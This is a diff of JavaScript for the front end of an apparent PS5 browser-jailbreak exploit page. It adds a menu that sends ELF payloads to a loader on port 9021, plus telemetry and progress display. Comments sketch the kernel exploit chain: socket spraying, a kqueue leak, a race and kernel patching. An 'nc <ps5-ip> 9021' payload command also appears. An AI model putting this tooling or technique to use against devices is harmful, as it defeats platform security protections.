+            + " menuTop=" + Math.round(menu.getBoundingClientRect().top));
+    } catch (e) { }
+    /* MEASURE. For image tiles this is a real check: artwork that failed to load
+       measures 0x0, and the grid then has nothing visible in it. (It could NOT catch
+       the text version's failure - those boxes measured perfectly and simply painted
+       no glyphs, which is why text is gone from here entirely.) */
+    if (useText && !lean) {
+        let bad = true;
+        try {
+            const t0 = tiles[0];
+            const r = t0 ? t0.getBoundingClientRect() : null;
+            const im = t0 ? t0.getElementsByTagName("img")[0] : null;
+            const ir = im ? im.getBoundingClientRect() : null;
+            // naturalWidth is the only honest 'did this decode' signal: the rect is
+            // still 0 while the PNG is in flight, which is what wrongly fell back to
+            // the flat menu on 2026-08-26.
+            const decoded = !im || im.naturalWidth > 0 || (ir && ir.width >= 8);
+            bad = !r || r.width < 8 || !decoded;
+            syncMark("WIN-MENU-VIEW", "kind=" + (poopsView ? "poopsploit-view" : "png-grid")
+                + " glyphAdvance=" + window.__p2jbGlyphAdvance
+                + "/" + window.__p2jbGlyphChars + "ch"
+                + " textPaints=" + (window.__p2jbTextPaints ? 1 : 0)
+                + " tiles=" + tiles.length
+                + " tile0=" + (r ? Math.round(r.width) + "x" + Math.round(r.height) : "none")
+                + " img0=" + (ir ? Math.round(ir.width) + "x" + Math.round(ir.height) : "none")
+                + " ok=" + (bad ? 0 : 1));
+        } catch (e) { bad = true; }
+        if (bad) {
+            window.__payloadMenuFallback = 1;
+            try { menu.className = ""; menu.style.display = "none"; } catch (e) { }
+            syncMark("WIN-MENU-FALLBACK", "grid artwork did not render - using the flat menu");
+            showPayloadMenu();
+            return;
+        }
+    }
+    /* FOCUS LAST, and only for looks. Focusing a tile forces a scroll and a repaint, and
+       on 2026-08-27 a retail 12.00 page went silent between WIN-MENU-SHOWN and WIN-MENU
+       with nothing but this call in between (the devkit, same build, sailed through to
+       WIN-MENU-VIEW). It used to sit before every measurement, so that death cost us the
+       geometry AND the glyph verdict for the whole run. Moved here: the menu is already
+       revealed and fully usable without focus, so if this is the killer it now costs
+       nothing but the highlight - and WIN-MENU-FOCUS says whether it survived. */
+    /* AND NOT AT ALL WHEN LEAN. focus() forces a scroll and a repaint, which is the same
+       forced synchronous layout the lean branch above just declined to do - skipping the
+       geometry read and then focusing would move the work, not remove it. The comment
+       above already records a retail 12.00 page dying with nothing but this call between
+       WIN-MENU-SHOWN and the next beacon.
+       On the post-jailbreak path the menu is revealed and fully clickable without it, so
+       under lean the last thing JS does is the WIN-MENU-LEAN beacon and the layout happens
+       on the compositor's own schedule. That also sharpens the next failure: if a run now
+       dies AFTER WIN-MENU-LEAN, JS finished and the death is in the async paint, which is
+       a different bug from this one. */
+    if (tiles.length && !lean) {
+        try { tiles[0].focus(); } catch (e) { }
+        try { syncMark("WIN-MENU-FOCUS", "tile focused - survived"); } catch (e) { }
+    }
+}
+
+function sendPayload(a) {
+    const name = a.getAttribute("data-name");
+    if (!name || a.classList.contains("busy")) return;
+    // classList, not className: poopsploit's tiles are "payloadTile btn" and a wholesale
+    // assignment drops btn, taking the button's background and padding with it.
+    a.classList.remove("sent", "failed");
+    a.classList.add("busy");
+    flushMark("PAYLOAD-SEND", name);
+    /* Feedback rules, learned the hard way:
+     *   - NO text inside #payloadMenu. The dynamically-built text overlay this menu
+     *     replaced measured zero-width (WIN-GEOM t1=0x27) and crashed the WebProcess,
+     *     because the PS5 browser lacks the families it asked for. Tile state is
+     *     expressed with CSS only.
+     *   - The reason goes to #stage, which is the surface every stage message already
+     *     uses and is known to render. Guarded by typeof so a scope change cannot throw
+     *     inside the click handler. */
+    const say = function (msg, cls) {
+        try { if (typeof stage === "function") stage(msg, cls); } catch (e) { }
+    };
+    /* Prefer delivering the ELF from INSIDE the console. After the jailbreak the page
+       has syscalls, so poops.js can socket()/connect()/write() to elfldr on
+       127.0.0.1:9021 itself - no server-side helper, so the tiles work on a purely
+       static host such as GitHub Pages. api/payload/<name> stays as the fallback for
+       the case where the direct path is unavailable (menu opened without a jailbreak
+       in this page, or an older poops.js). */
+    /* DIAGNOSTIC: record which delivery path this click takes, and why. */
+    try {
+        flushMark("ELFDIRECT-PROBE", name
+            + "-typeof=" + (typeof window.__sendElfDirect)
+            + "-origin=" + String(location.origin || "?").replace(/[^A-Za-z0-9.:_-]/g, "_"));
+    } catch (e) { }
+    if (typeof window.__sendElfDirect === "function") {
+        say("sending " + name + " directly...", "");
+        /* WAIT FOR elfldr, DO NOT ASSUME IT. kexp's join returning 0 is not the same
+           event as elfldr's listen() landing, and this menu also opens on the
+           ?payloads=1 path, where the console may never have been jailbroken at all.
+           Both end the same way: one "connect 127.0.0.1:9021: ret=-1" per tap, eight
+           times in a row on 2026-08-26. Poll the port with bind() - never an empty
+           connect, which wedges the loader - for up to 5 s, then say so in words. */
+        (async function () {
+            if (typeof window.__elfldrListening === "function") {
+                let up = false;
+                for (let i = 0; i < 25 && !up; ++i) {
+                    try { up = await window.__elfldrListening(); } catch (e) { up = false; }
+                    if (!up) await new Promise(function (r) { setTimeout(r, 200); });
+                }
+                flushMark("ELFLDR-READY", name + "-listening=" + (up ? 1 : 0));
+                if (!up) {
+                    a.classList.remove("busy", "sent");
+                a.classList.add("failed");
+                    say("elfldr is not listening on port 9021 - jailbreak first, then"
+                        + " send " + name, "bad");
+                    return;
+                }
+            }
+            return window.__sendElfDirect(name)
+                .then(function (bytes) {
+                    a.classList.remove("busy", "failed");
+                a.classList.add("sent");
+                    say("sent " + name + " - " + bytes + " bytes -> console:9021 (direct)", "ok");
+                    flushMark("PAYLOAD-RESULT", name + "-ok=1-bytes=" + bytes + "-via=direct");
+                })
+                .catch(function (e) {
+                    const why = String((e && e.message) || e).slice(0, 80);
+                    a.classList.remove("busy", "sent");
+                a.classList.add("failed");
+                    say(name + " FAILED: " + why + "  |  send it yourself:  nc <ps5-ip> 9021 < " + name, "bad");
+                    flushMark("PAYLOAD-RESULT", name + "-FAILED-direct-" + why.slice(0, 50));
+                });
+        })();
+        return;
+    }
+    fetch("api/payload/" + encodeURIComponent(name), { method: "POST", body: "" })
+        .then(function (r) {
+            // A static host has no api/payload/, so it answers 404 (or an HTML error
+            // page). Catch that here rather than letting r.json() throw a parser error
+            // that says nothing useful.
+            if (!r.ok) throw new Error(r.status === 404
+                ? "no payload helper on this host (HTTP 404)"
+                : "HTTP " + r.status);
+            return r.json();
+        })
+        .then(function (j) {
+            if (!j || !j.ok) throw new Error((j && j.error) || "server reported failure");
+            a.classList.remove("busy", "failed");
+            a.classList.add("sent");
+            say("sent " + name + " - " + j.bytes + " bytes -> " + (j.to || "console:9021"), "ok");
+            flushMark("PAYLOAD-RESULT", name + "-ok=1-bytes=" + j.bytes);
+        })
+        .catch(function (e) {
+            const why = String((e && e.message) || e).slice(0, 80);
+            a.classList.remove("busy", "sent");
+            a.classList.add("failed");
+            say(name + " FAILED: " + why + "  |  send it yourself:  nc <ps5-ip> 9021 < " + name, "bad");
+            flushMark("PAYLOAD-RESULT", name + "-FAILED-" + why.slice(0, 60));
+        });
+}
+
+window.showWin = showWin;
+
+let marksQueued = 0;
+let marksBlocked = 0;
+const markStats = () => ({ queued: marksQueued, blocked: marksBlocked });
+function queueEvent(tag, extra) {
+    marksQueued++;
+    teleQueue.push(beaconLine(tag, extra));
+    screenMark(tag, extra);
+    if (teleQueue.length >= TELE_QUEUE_CAP) flushQueue(false);
+}
+function flushQueue(allowSync) {
+    if (allowSync === undefined) allowSync = true;
+    if (teleQueue.length === 0) return;
+    const lines = teleQueue.splice(0, teleQueue.length);
+    let body = "[\n";
+    for (let i = 0; i < lines.length; ++i)
+        body += JSON.stringify(lines[i]) + (i + 1 < lines.length ? ",\n" : "\n");
+    body += "]\n";
+    let sent = false;
+    try {
+        if (navigator && typeof navigator.sendBeacon === "function")
+            sent = navigator.sendBeacon("t", new Blob([body], { type: "text/plain" }));
+    } catch { }
+    if (!sent && !allowSync) {
+        for (let i = lines.length - 1; i >= 0; --i) teleQueue.unshift(lines[i]);
+        if (teleQueue.length > TELE_QUEUE_CAP * 2) {
+            const drop = teleQueue.length - TELE_QUEUE_CAP;
+            teleQueue.splice(0, drop);
+            teleDropped += drop;
+            teleQueue.unshift(beaconLine("TELE-DROPPED",
+                "lines=" + teleDropped + "-sendBeacon-refused"));
+        }
+        return;
+    }
+    if (!sent) {
+        /* Same hazard as the log/ beacon: on a static host "t" does not exist, a 404 does not
+           throw, and this SYNCHRONOUS POST would block the main thread for a full internet
+           round trip on every flush. Latch it off after the first non-2xx. Separate flag from
+           the log/ latch because they are separate endpoints. */
+        if (!window.__teleOff) {
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", "t", false);
+                xhr.setRequestHeader("Content-Type", "text/plain");
+                xhr.send(body);
+                if (xhr.status && (xhr.status < 200 || xhr.status >= 300)) window.__teleOff = true;
+            } catch (e) { window.__teleOff = true; }
+        }
+    }
+}
+
+// Big pinned status readout: updated IN PLACE (no scroll spam) so the long silent
+// leak phase shows live progress instead of looking hung. p2jb calls window.liveStatus.
+// DOM-only (no XHR) so it is cheap enough to call every feed iteration.
+//
+// WHY THIS IS A TICKER AND NOT JUST A FUNCTION.
+// The old version only ever repainted when p2jb CALLED it. Two phases do not call it in
+// their loop, so the whole readout - including the elapsed clock - sat frozen:
+//   DRAIN    one call with a hardcoded pct=100, then 8-10 minutes of silence while the
+//            workers chew through the ~152 KB still buffered in the pipes.
+//   PRE-BURN no call at all; a tight synchronous fd-closing loop.
+// Frozen numbers next to "100%" read as a hang, which is exactly what it looked like.
+//
+// Now the state is stored and a 1 Hz timer repaints it, so the clock always moves even
+// when the exploit is busy. The timer is started LAZILY on the first real phase (the leak
+// feed), never at page load: before that the heap groom is running and adding periodic DOM
+// writes could perturb the layout the groom depends on. p2jb also now reports real
+// progress during drain and pre-burn, so the two fixes reinforce rather than paper over.
+window.liveStatus = (function () {
+    var el = null, lastBeacon = 0, ticker = null;
+    var RUN_T0 = Date.now();
+    // Per-phase stats. The ETA extrapolates from the RECENT rate over a sliding window,
+    // not the lifetime average, so it adapts when throughput changes and does not count
+    // setup time as leak time.
+    var key = null, t0 = 0, rate = null, lastMove = 0, samples = [], lastP = null;
+    var curText = "", curPct = null, overallMax = 0;
+    var WIN_MS = 45000, MIN_SPAN_MS = 4000;
+
+    // Measured phase budgets in seconds, in the order stage0 actually runs them.
+    // leak+drain are the 2^32 kqueueex grind: the drain is the ~14.5% of those calls still
+    // buffered in the pipes when the feed loop finishes, which is why it gets its own slice
+    // rather than being hidden behind a 100% bar.
+    var W = { setup: 120, leak: 2700, drain: 620, topup: 115, burn: 60, preburn: 15, race: 300 };
+    var ORDER = ["setup", "leak", "drain", "topup", "burn", "preburn", "race"];
+    var TOTAL = 0; for (var q = 0; q < ORDER.length; q++) TOTAL += W[ORDER[q]];
+
+    function hms(s) {
+        if (!isFinite(s) || s < 0) s = 0;
+        return String(Math.floor(s / 3600)).padStart(2, "0") + ":"
+            + String(Math.floor(s / 60) % 60).padStart(2, "0") + ":"
+            + String(Math.floor(s) % 60).padStart(2, "0");
+    }
+    function clock(ms) {
+        var d = new Date(ms);
+        return String(d.getHours()).padStart(2, "0") + ":"
+            + String(d.getMinutes()).padStart(2, "0");
+    }
+    function meter(frac, n) {
+        var f = Math.max(0, Math.min(n, Math.round(frac * n)));
+        return "[" + "#".repeat(f) + ".".repeat(n - f) + "]";
+    }
+
+    function ensureEl() {
+        if (el) return el;
+        el = document.createElement("pre");
+        el.id = "livestat";
+        var s = document.getElementById("scr");
+        if (s && s.parentNode) s.parentNode.insertBefore(el, s);
+        else document.body.insertBefore(el, document.body.firstChild);
+        return el;
+    }
+
+
+    /* "DO NOT TURN OFF" BANNER.
+       From the drain onward the exploit holds the JS thread in tight loops, so the 1 Hz
+       repaint above cannot run and the clock visibly stalls for stretches. That is normal,
+       but a frozen-looking screen ~45 minutes into a run is exactly when someone reaches
+       for the power button - and pulling power here throws away the whole leak.
+       The banner appears once the leak is done and stays up until the payload menu
+       replaces the run UI (showPayloadMenu hides every body child except the menu, so it
+       clears itself without any extra bookkeeping). */
+    var warnEl = null;
+    function ensureWarn() {
+        // Same reason as render(): once the menu is up this must not resurrect itself.
+        if (window.__P2JB_MENU_OPEN) return warnEl;
+        if (warnEl) return warnEl;
+        warnEl = document.createElement("div");
+        warnEl.id = "nokill";
+        warnEl.style.cssText =
+            "margin:8px 0;padding:10px 12px;border:2px solid #b3261e;border-radius:8px;"
+            + "background:#2a0f0f;color:#ff6b6b;text-align:center;letter-spacing:.03em;"
+            + "font:700 16px/1.45 system-ui,-apple-system,Segoe UI,sans-serif";
+        warnEl.textContent = "DO NOT TURN OFF OR RESTART - WAIT UNTIL ELFLDR BEGINS";
+        var line2 = document.createElement("div");
+        line2.style.cssText = "margin-top:4px;color:#e0a0a0;font:400 13px/1.4 system-ui,sans-serif";
+        line2.textContent = "the clock may stop moving for a while here - that is normal";
+        warnEl.appendChild(line2);
+        var e = ensureEl();
+        if (e && e.parentNode) e.parentNode.insertBefore(warnEl, e.nextSibling);
+
+        /* THE OOM IS EXPECTED - SAY SO BEFORE IT HAPPENS.
+           On 12.00 and 12.70 the console raises "Out of Memory" / "cannot load page" /
+           a system software error immediately after the jailbreak, when the payload page
+           loads. Dismissing it respawns the WebProcess and the ELF page then opens
+           normally - the jailbreak is NOT lost. Without this note that dialog reads as a
+           failure and people power-cycle a console that actually succeeded, throwing away
+           the whole hour. Yellow, directly under the red banner, up at the same time.
+           This element is a sibling of #nokill and a plain body child, so the menu's
+           hide-everything-except-the-menu sweep clears it with no extra bookkeeping. */
+        var oom = document.createElement("div");
+        oom.id = "oomnote";
+        oom.style.cssText =
+            "margin:8px 0;padding:10px 12px;border:2px solid #b38b00;border-radius:8px;"
+            + "background:#2a2410;color:#ffd24d;text-align:center;letter-spacing:.02em;"
+            + "font:700 15px/1.45 system-ui,-apple-system,Segoe UI,sans-serif";
+        oom.textContent = "AT THE END YOU MAY SEE \"Out of Memory\", \"Cannot load page\""
+            + " OR A SYSTEM SOFTWARE ERROR - THIS IS NORMAL";
+        var oomLine2 = document.createElement("div");
+        oomLine2.style.cssText =
+            "margin-top:4px;color:#e8d9a0;font:400 13px/1.4 system-ui,sans-serif";
+        oomLine2.textContent = "Just press OK / Next and the ELF payload page will open."
+            + " The jailbreak is not lost - do NOT power off.";
+        oom.appendChild(oomLine2);
+        if (warnEl.parentNode) warnEl.parentNode.insertBefore(oom, warnEl.nextSibling);
+        return warnEl;
+    }
+    var WARN_FROM = ORDER.indexOf("drain");
+
+    function render() {
+        try {
+            if (!el) return;
+            // MENU IS UP - STOP PAINTING. The run UI used to die with the page, because a
+            // jailbroken run navigated to a fresh document. It now opens the payload menu
+            // IN PLACE, so this 1 Hz ticker survives the handover: it kept repainting
+            // #livestat and ensureWarn() kept re-creating the red banner every second,
+            // leaving "step 7/7 race 5.80%" on screen with the menu underneath it and no
+            // ELF tiles visible. Observed on 12.70 devkit after a fully successful run -
+            // elfldr was loaded and the console jailbroken, purely a display fault.
+            if (window.__P2JB_MENU_OPEN) {
+                /* CANCEL, do not merely return. Returning leaves the interval firing once
+                   a second for the entire life of the menu, and every wakeup is a timer
+                   task on the main thread of a renderer that is holding the whole exploit
+                   - hundreds of parked fds, the spray buffers, the JIT RWX mapping - while
+                   ten PNG tiles are still decoding. Nothing downstream of the win wants
+                   this ticker again, so stop it. */
+                try { if (ticker) { clearInterval(ticker); ticker = null; } } catch (e) { }
+                return;
+            }
+            try {
+                if (WARN_FROM >= 0 && ORDER.indexOf(key) >= WARN_FROM) ensureWarn();
+            } catch (e) { }
+            var now = Date.now();
+            var phaseSecs = (now - t0) / 1000;
+            var runSecs = (now - RUN_T0) / 1000;
+            var pct = curPct, bar = "";
+
+            if (typeof pct === "number" && pct >= 0) {
+                bar = "\n" + meter(pct / 100, 40) + " " + pct.toFixed(2) + "%";
+                if (pct >= 99.999) {
+                    bar += "   COMPLETE";
+                } else if (rate && rate > 0) {
+                    var eta = Math.round((100 - pct) / rate);
+                    bar += "   " + (rate * 60).toFixed(2) + "%/min"
+                        + "   ETA " + hms(eta) + "   done ~" + clock(now + eta * 1000);
+                } else {
+                    bar += "   ETA --:--:--";
+                }
+                var idle = Math.round((now - lastMove) / 1000);
+                if (idle > 45) bar += "   (no progress for " + idle + "s)";
+            }
+
+            // OVERALL: how much of the RUN is left, not just of the phase. Without this the
+            // per-phase bar hits 100% at the end of the feed and then sits there through
+            // drain, top-up, pre-burn and 96 race attempts.
+            var oi = ORDER.indexOf(key);
+            if (oi >= 0) {
+                var before = 0; for (var r = 0; r < oi; r++) before += W[ORDER[r]];
+                var f = (typeof pct === "number" && pct >= 0)
+                    ? Math.min(1, pct / 100)
+                    : Math.min(1, phaseSecs / W[key]);
+                var doneSec = before + f * W[key];
+                // monotonic: a phase that finishes early must not make the overall bar
+                // jump backwards when the next phase starts at 0%
+                if (doneSec > overallMax) overallMax = doneSec; else doneSec = overallMax;
+                var leftSec = Math.max(0, TOTAL - doneSec);
+                bar += "\nOVERALL " + meter(doneSec / TOTAL, 40) + " "
+                    + ((doneSec / TOTAL) * 100).toFixed(1) + "%"
+                    + "   step " + (oi + 1) + "/" + ORDER.length + " (" + key + ")"
+                    + "   ~" + hms(leftSec) + " left"
+                    + "   done ~" + clock(now + leftSec * 1000);
+            }
+
+            el.textContent = "P2JB   total " + hms(runSecs)
+                + "   " + (key || "main") + " " + hms(phaseSecs)
+                + "\n" + curText + bar;
+        } catch (e) { }
+    }
+
+    return function (text, pct, phase) {
+        var now = Date.now();
+        try {
+            ensureEl();
+            var pk = phase || "main";
+            if (pk !== key) {
+                key = pk; t0 = now; rate = null; lastMove = now; samples = []; lastP = null;
+            }
+            curText = text;
+            curPct = (typeof pct === "number" && pct >= 0) ? pct : null;
+            if (curPct !== null) {
+                samples.push({ t: now, p: curPct });
+                while (samples.length > 2 && now - samples[0].t > WIN_MS) samples.shift();
+                var first = samples[0], span = now - first.t, gain = curPct - first.p;
+                if (span >= MIN_SPAN_MS && gain > 0) rate = gain / (span / 1000);
+                if (lastP === null || curPct > lastP) { lastP = curPct; lastMove = now; }
+            }
+            // Start the repaint timer only once a real phase is running. Before that the
+            // heap groom is in progress and periodic DOM writes are not worth the risk.
+            if (!ticker && ORDER.indexOf(pk) >= 0) {
+                ticker = setInterval(render, 1000);
+            }
+            render();
+        } catch (e) { }
+        // throttled copy to the host log so progress is visible off-console too
+        try {
+            if (now - lastBeacon > 15000) {
+                lastBeacon = now;
+                flushMark("PROGRESS", text + (typeof pct === "number" ? " pct=" + pct.toFixed(2) : "")
+                    + (rate ? " rate=" + (rate * 60).toFixed(2) + "%/min" : ""));
+            }
+        } catch (e) { }
+    };
+})();
+
+// Guaranteed-synchronous beacon: blocks until delivered, bypasses raceMode/queue.
+// Use for crash-adjacent markers (thread spawn) so the last line before a SIGILL is
+// never lost. p2jb.js calls window.syncMark(tag, extra).
+window.syncMark = function (tag, extra) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open("GET", "log/" + encodeURIComponent(beaconLine("SYNC-" + tag, String(extra))), false);
+        x.send();
+    } catch (e) { }
+    // THE WIN CHECK HAS TO BE HERE TOO, not only in flushMark.
+    //
+    // p2jb.js emits the kexp join through window.syncMark, never through flushMark - that
+    // is why the beacon reads "SYNC-KEXP-JOIN". flushMark owns the wonJoin test, so on a
+    // p2jb run the test was never evaluated and showWin() was never called: run rmswwc4u4
+    // jailbroke, kexp completed, elfldr came up on :9021, and the operator was left on the
+    // progress screen with no payload menu and no WIN-OVERLAY/WIN-MENU beacon at all.
+    // The comment in flushMark records fixing the tag SPELLING for p2jb; the check was
+    // still sitting in the function p2jb's join does not go through.
+    try {
+        var wonJoin = (tag === "STAGE5-DONE" || tag === "KEXP-JOIN")
+            && /(?:^|[\s-])joinRet=(?:0x)?0(?:[\s-]|$)/.test(String(extra) || "");
+        if (!window.__won && wonJoin) showWin();
+    } catch (e) { }
+};
+
+function flushMark(tag, extra) {
+
+    // Win the moment elfldr is ready, OR on a jailbroken verdict, whichever fires first.
+    //
+    // This used to watch ONLY for poops's vocabulary - the literal string "jailbroken=1"
+    // and a STAGE5-DONE tag carrying "joinRet=0" - so on a p2jb run it never fired once:
+    // p2jb says "is_jailbroken() = true" (parentheses and spaces around the =) and tags
+    // the join "KEXP-JOIN" with "joinRet=0x0" (hex, not decimal). A completely successful
+    // jailbreak therefore left the operator staring at the progress screen with elfldr
+    // already listening. Both spellings are accepted now.
+    // GATED ON THE JOIN ONLY - deliberately NOT on a "jailbroken" verdict.
+    //
+    // A verdict trigger fires at stage 6, which is several stages before elfldr exists,
+    // and showWin() is not cheap: full-screen overlay, gif fetch, payload buttons, a pile
+    // of DOM construction. Running that mid-exploit - kernel freshly patched, worker
+    // threads still parked, stage 7 and the kexp handoff still to come - is exactly what
+    // the run of 2026-08-16 did just before it stopped dead at stage 6 (WIN-OVERLAY was
+    // the last beacon; the triggering mark never even got logged, because showWin()
+    // beacons before flushMark writes the mark that called it).
+    //
+    // KEXP-JOIN joinRet=0 IS the moment elfldr is listening, and by then the exploit is
+    // finished, so the DOM work is harmless. STAGE5-DONE is poops's spelling of the same
+    // moment and is kept for it.
+    const wonJoin = (tag === "STAGE5-DONE" || tag === "KEXP-JOIN")
+        && /(?:^|[\s-])joinRet=(?:0x)?0(?:[\s-]|$)/.test(extra || "");
+    if (!window.__won && wonJoin)
+        showWin();
+
+    if (raceMode && CRITICAL_MARKS[tag] !== 1) { queueEvent(tag, extra); return; }
+    marksBlocked++;
+    const line = beaconLine(tag, extra);
+    screenMark(tag, extra);
+    /* The beacon endpoint is OPTIONAL. A static host (GitHub Pages) has no log/ route and
+       answers 404 - and a 404 does NOT throw, so the old try/catch never noticed and every
+       single mark kept issuing a SYNCHRONOUS cross-internet XHR. That blocks the main thread
+       for a full round trip per mark, thousands of times per run (one 10.20 run emitted
+       ~16,000 marks in stage 2 alone), while the exploit deliberately retains its poisoned
+       carrier/string graphs so JSC can never GC them. The renderer then dies with "out of
+       memory" - which is exactly why a run that is fine against the LAN host died at
+       ps10_stage5 when served from GitHub Pages.
+       Latch the endpoint off after the first non-2xx or throw. The on-screen log is
+       unaffected, and against a real host (2xx) nothing changes at all.
+       Firmware-independent: this is page transport, not per-firmware offsets. */
+    /* Where do beacons go?
+       Served from the exploit host (manuals.playstation.net -> the LAN box) the log/ route
+       exists, so keep the proven same-origin synchronous XHR - ordering and delivery are
+       guaranteed before the next mark is produced.
+       Served from anywhere else - GitHub Pages, a private site - log/ does not exist there.
+       Rather than lose telemetry, aim the beacon at the exploit host by absolute URL. That
+       hostname still resolves to the host and the console already trusts its certificate
+       (it is how the page itself was served), so there is no mixed-content block. Sent as an
+       image GET: no CORS preflight, no response needed, and crucially ASYNCHRONOUS - the
+       blocking sync XHR across the internet is what OOM-killed the renderer.
+       If that host is not reachable either, the image simply errors and is dropped; the
+       on-screen log is unaffected. Firmware-independent - this is page transport. */
+    var LOG_ORIGIN = "";   /* cross-origin beacons DISABLED. The absolute-URL variant
+          never delivered a single beacon - the console will not load a subresource from
+          the host's self-signed cert - and it was active ONLY when served remotely,
+          which is exactly when p2jb stopped loading. Forced empty so the proven
+          same-origin path below always runs; the image branch is now unreachable.
+          Do not re-enable without first proving a cross-origin beacon reaches the host. */
+    if (!LOG_ORIGIN) {
+        if (!window.__beaconOff) {
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", "log/" + encodeURIComponent(line), false);
+                xhr.send();
+                if (xhr.status && (xhr.status < 200 || xhr.status >= 300)) {
+                    window.__beaconOff = true;
+                    try { screenMark("BEACON-OFF",
+                        "log/ -> HTTP " + xhr.status + " - server log disabled for this run"); } catch (e) { }
+                }
+            } catch (e) { window.__beaconOff = true; }
+        }
+    } else if (!window.__beaconOff) {
+        try {
+            const im = new Image();
+            im.onerror = function () {
+                if (!window.__beaconOff) {
+                    window.__beaconOff = true;
+                    try { screenMark("BEACON-OFF",
+                        "cross-origin log unreachable - server log disabled"); } catch (e) { }
+                }
+            };
+            im.src = LOG_ORIGIN + "log/" + encodeURIComponent(line);
+        } catch (e) { window.__beaconOff = true; }
+    }
+
+    flushQueue(!raceMode);
+}
+
+/* ---- STATIC-HOST FALLBACK -------------------------------------------------
+ * The one-shot latch normally lives on ps-exploit-host (GET latch, latch/set-,
+ * latch/escalate-, latch/clear). A plain static web server 404s those, and the boot
+ * gate below treats `unreachable` as fatal: it renders the "clear latch" button and
+ * RETURNS without running anything. That is the whole reason this page appeared broken
+ * when served from a normal file server.
+ *
+ * So: try the host first, exactly as before; if it is not there, fall back to a
+ * sessionStorage latch so the page still works standalone.
+ *
+ * STORAGE CHOICE: localStorage, not sessionStorage. The host latch lives on the PC and
+ * survives EVERYTHING the console does - reboot, browser close, WebProcess crash - and is
+ * cleared only by an explicit ?clear=1, by ?auto=1, or by a clean run releasing it. That
+ * persistence IS the guard: it forces the operator to acknowledge the reboot.
+ * sessionStorage would die whenever the browser session ends, which includes a WebProcess
+ * CRASH followed by a relaunch - precisely when the console is dirtiest (setuid(1) is
+ * irreversible for the boot) and the latch is most needed. localStorage reproduces the
+ * host semantics; sessionStorage is only the fallback if localStorage is unavailable.
+ */
+const LATCH_KEY = "p2jb:oneshot-latch";
+let latchIsLocal = false;
+/* localStorage first (survives reboot + browser restart, like the host latch);
+   sessionStorage only if localStorage is unavailable. */
+function latchStore() {
+    try { if (typeof localStorage !== "undefined" && localStorage) return localStorage; }
+    catch (e) { }
+    try { if (typeof sessionStorage !== "undefined" && sessionStorage) return sessionStorage; }
+    catch (e) { }
+    return null;
+}
+const localLatch = {
+    read() {
+        try {
+            const s = latchStore(); if (!s) return { set: 0, local: 1, nostore: 1 };
+            const v = s.getItem(LATCH_KEY);
+            return v ? { set: 1, detail: v, local: 1 } : { set: 0, local: 1 };
+        } catch (e) { return { set: 0, local: 1 }; }
+    },
+    write(d) {
+        try { const s = latchStore(); if (s) s.setItem(LATCH_KEY, String(d || "?")); } catch (e) { }
+        return { set: 1, detail: d, local: 1 };
+    },
+    wipe() {
+        try { const s = latchStore(); if (s) s.removeItem(LATCH_KEY); } catch (e) { }
+        return { set: 0, local: 1 };
+    },
+};
+
+let latchState = "";
+const latch = {
+    async read() {
+        try {
+            const r = await fetch("latch", { cache: "no-store" });
+            if (!r.ok) { latchIsLocal = true; const j2 = localLatch.read(); latchState = j2.set ? "held" : "clear"; return j2; }
+            const j = await r.json();
+            if (j && typeof j === "object") {
+                latchState = j.set ? "held" : "clear";
+                return j;
+            }
+            latchIsLocal = true;
+            { const j2 = localLatch.read(); latchState = j2.set ? "held" : "clear"; return j2; }
+        } catch (e) {
+            latchIsLocal = true;
+            const j2 = localLatch.read(); latchState = j2.set ? "held" : "clear"; return j2;
+        }
+    },
+    async set(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-SET", d);
+        try {
+            const r = await fetch("latch/set-" + encodeURIComponent(d),
+                { cache: "no-store" });
+            if (!r.ok) { latchIsLocal = true; latchState = "held"; return localLatch.write(d); }
+            const j = await r.json();
+            latchState = j && j.set ? "held" : "clear";
+            return j;
+        } catch (e) { latchIsLocal = true; latchState = "held"; return localLatch.write(d); }
+    },
+
+    async escalate(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-ESCALATE", d);
+        try {
+            const r = await fetch("latch/escalate-" + encodeURIComponent(d),
+                { cache: "no-store" });
+            if (!r.ok) { latchIsLocal = true; latchState = "held"; return localLatch.write(d); }
+            const j = await r.json();
+            latchState = j && j.set ? "held" : "clear";
+            return j;
+        } catch (e) { latchIsLocal = true; latchState = "held"; return localLatch.write(d); }
+    },
+    async clear() {
+        flushMark("LATCH-CLEAR", "operator-request");
+        try {
+            const r = await fetch("latch/clear", { cache: "no-store" });
+            if (!r.ok) { latchIsLocal = true; latchState = "clear"; return localLatch.wipe(); }
+            const j = await r.json();
+            latchState = j && j.set ? "held" : "clear";
+            return j;
+        } catch (e) { latchIsLocal = true; latchState = "clear"; return localLatch.wipe(); }
+    }
+};
+
+const stageEl = document.getElementById("stage");
+const dangerEl = document.getElementById("danger");
+const rebootEl = document.getElementById("reboot");
+const verdictEl = document.getElementById("verdict");
+const vitalsEl = document.getElementById("vitals");
+const cfgEl = document.getElementById("cfg");
+const rowsEl = document.getElementById("rows");
+const tallyEl = document.getElementById("tally");
+const summaryEl = document.getElementById("summary");
+const navEl = document.getElementById("nav");
+const rowByKey = new Map();
+
+function stage(text, cls) { stageEl.textContent = text; stageEl.className = cls || ""; }
+function danger(text) { dangerEl.textContent = text; dangerEl.className = "on"; }
+
+function verdictBanner(kind, text) {
+    verdictEl.textContent = text;
+    verdictEl.className = "on" + (kind ? " " + kind : "");
+}
+function vitals(text) { vitalsEl.textContent = text; vitalsEl.className = "on"; }
+
+function showVerdict(reboot, text) {
+    if (window.__won) return;   // keep the JELBREK SUCOOS win box; never repaint red
+    rebootEl.textContent = text;
+    rebootEl.className = reboot ? "on" : "on fine";
+}
+
+function vitalsText(prefix) {
+    const common = prefix + cfg.sockets + " IPv6 SOCKETS (up to "
+        + (cfg.sockets * 360) + " BYTES of kernel routing headers, sprayed and " + "freed repeatedly), 2 AF_UNIX SOCKETPAIRS, 2 PIPES, and TWELVE " + "raw kernel threads pinned to one core at PRI_REALTIME/256.\n";
+    if (cfg.trigger === "none")
+        return common
+            + "TRIGGER: NONE";
+    if (cfg.trigger === "netcontrol")
+        return common
+            + "TRIGGER: NETCONTROL";
+    return common
